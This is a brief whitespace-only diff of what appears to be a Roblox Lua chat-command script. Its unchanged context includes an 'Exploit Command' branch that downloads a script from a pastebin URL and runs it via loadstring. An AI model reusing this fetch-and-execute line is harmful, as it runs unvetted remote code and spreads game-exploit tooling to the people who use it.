@@ -258,12 +258,12 @@ while true do
                     mate = false
                 end
 				
-			elseif msg == command19 then
+	    elseif msg == command19 then
                 -- Exploit Command
                    loadstring(game:HttpGet("https://pastebin.com/raw/0Cfcpxgh"))()
                 end
 
-			elseif msg == command20 then
+            elseif msg == command20 then
                 -- Common Sense Command
                 if not mate then
                    mate = true
